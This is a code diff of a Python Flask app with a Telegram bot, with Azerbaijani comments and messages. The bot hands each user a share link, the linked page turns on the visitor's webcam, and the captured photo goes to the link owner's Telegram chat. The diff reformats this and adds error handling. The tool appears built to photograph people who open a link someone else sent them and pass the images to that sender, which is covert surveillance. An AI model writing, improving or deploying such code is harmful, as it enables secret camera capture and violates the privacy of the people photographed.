@@ -20,7 +20,7 @@ USERS_FILE = "users.json"
 
 app = Flask(__name__)
 
-# --- 2. DATABASE HELPER (Kodun içində qaldı) ---
+# --- 2. DATABASE HELPER ---
 def load_users():
     if os.path.exists(USERS_FILE):
         try:
@@ -38,24 +38,41 @@ def save_users(users):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     users = load_users()
+    
     if str(user.id) not in users:
-        users[str(user.id)] = {'name': user.first_name, 'joined': datetime.now().isoformat(), 'photos_received': 0}
+        users[str(user.id)] = {
+            'name': user.first_name,
+            'joined': datetime.now().isoformat(),
+            'photos_received': 0
+        }
         save_users(users)
     
     share_link = f"{WEBHOOK_URL}/share?user_id={user.id}"
-    message = (f"👋 Salam {user.first_name}!\n\n📱 **Sizin Özəl Linkiniz:**\n{share_link}\n\n"
-               f"💡 **Bu linki başqasına göndərin:**\n- Onlar linki açsın\n- Kamera icazəsi versin\n"
-               f"- Şəkil çəksin\n- Şəkil sizə gələcək! ✅")
+    message = (
+        f"👋 Salam {user.first_name}!\n\n"
+        f"📱 **Sizin Özəl Linkiniz:**\n{share_link}\n\n"
+        f"💡 **Bu linki başqasına göndərin:**\n"
+        f"- Onlar linki açsın\n"
+        f"- Kamera icazəsi versin\n"
+        f"- Şəkil çəksin\n"
+        f"- Şəkil sizə gələcək! ✅"
+    )
     
     keyboard = [[InlineKeyboardButton("📋 Linki Kopyala", url=share_link)]]
     await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
+    logger.info(f"User {user.id} logged in.")
+
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.message.photo:
+        await update.message.reply_text("✅ Şəkil qəbul edildi!")
 
 def run_bot():
     bot_app = Application.builder().token(BOT_TOKEN).build()
     bot_app.add_handler(CommandHandler("start", start))
+    bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     bot_app.run_polling()
 
-# --- 4. FLASK WEB SERVER (Sənin orijinal HTML kodunla) ---
+# --- 4. FLASK WEB SERVER ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="az">
@@ -105,7 +122,8 @@ HTML_TEMPLATE = """
         });
         async function captureAndSend() {
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photoDataUrl = canvas.toDataURL('image/jpeg');
             await fetch('/upload-photo', {
@@ -123,23 +141,34 @@ HTML_TEMPLATE = """
 def share():
     user_id = request.args.get('user_id')
     users = load_users()
-    if not user_id or user_id not in users: return "Xəta", 400
+    if not user_id or user_id not in users:
+        return "<h1>❌ Xəta: Etibarsız və ya səhv link.</h1>", 400
     return render_template_string(HTML_TEMPLATE, user_id=user_id)
 
 @app.route('/upload-photo', methods=['POST'])
 def upload_photo():
     try:
         data = request.get_json()
-        uid, photo_base64 = data.get('user_id'), data.get('photo')
+        user_id = data.get('user_id')
+        photo_base64 = data.get('photo')
+        if not user_id or not photo_base64: return jsonify({'success': False}), 400
+        
         photo_bytes = base64.b64decode(photo_base64.split(',')[1])
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
-                      files={'photo': photo_bytes}, data={'chat_id': uid})
-        users = load_users()
-        if uid in users:
-            users[uid]['photos_received'] = users[uid].get('photos_received', 0) + 1
-            save_users(users)
-        return jsonify({'success': True})
-    except: return jsonify({'success': False}), 500
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
+        payload = {'chat_id': user_id, 'caption': f"📸 Yeni Şəkil!"}
+        
+        response = requests.post(url, files=files, data=payload)
+        if response.status_code == 200:
+            users = load_users()
+            if user_id in users:
+                users[user_id]['photos_received'] = users[user_id].get('photos_received', 0) + 1
+                save_users(users)
+            return jsonify({'success': True})
+        return jsonify({'success': False}), 500
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        return jsonify({'success': False}), 500
 
 if __name__ == '__main__':
     Thread(target=lambda: app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False), daemon=True).start()
